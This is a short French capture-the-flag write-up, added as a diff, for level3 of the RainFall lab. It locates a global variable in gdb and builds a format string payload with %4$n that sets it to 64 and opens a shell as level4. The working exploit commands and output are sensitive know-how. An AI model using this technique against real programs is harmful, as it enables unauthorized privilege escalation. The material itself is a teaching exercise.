@@ -1,0 +1,30 @@
+Le main appelle une fonction P et on s'apercoit tres vite que si la variable globale 'm' vaut 64 on rentre dans la condition et un shell est lancé
+
+L'idée est de trouver ou est m 
+
+(gdb) p &m
+$2 = (<data variable, no debug info> *) 0x804988c
+
+m = 0x804988c
+
+Il faudrait pouvoir ecrire l'adresse de m sur la stack au bon endroit
+
+41306141 est le 4eme argument correspont au 4 premier byte du debut du buffer offset 0
+
+La prochaine etape serait d'ecrire la valeur 64 a la valeur de m
+
+On peut utiliser %n pour ecrire a l'adresse qu'on lui donne le nombre de caractere qu'il a deja ecrit
+
+\x8c\x98\x04\x08Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9%4$n
+
+le %4$n permet d'écrire au 4 ème argument qui est le début du buffer 
+
+level3@RainFall:~$ printf "\x8c\x98\x04\x08Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9%%4\$n" > /tmp/level3
+level3@RainFall:~$ cat /tmp/level3 - | ./level3 
+   
+�Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+Wait what?!
+whoami
+level4
+
+youpi
